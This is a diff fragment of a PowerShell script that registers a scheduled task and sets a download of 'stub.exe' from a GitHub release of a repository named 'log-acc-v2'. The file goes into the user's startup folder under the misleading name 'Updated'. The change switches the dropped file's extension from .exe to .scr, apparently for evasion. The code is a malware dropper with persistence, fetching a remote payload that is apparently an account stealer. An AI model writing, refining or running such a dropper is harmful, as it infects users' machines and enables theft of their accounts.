@@ -18,7 +18,7 @@ Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $ta
 
 
 $url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/stub.exe"
-$output = "$startupfolder\Updated.exe"
+$output = "$startupfolder\Updated.scr"
 
 if (Test-Path -Path $output) {
     Write-Host "hello"
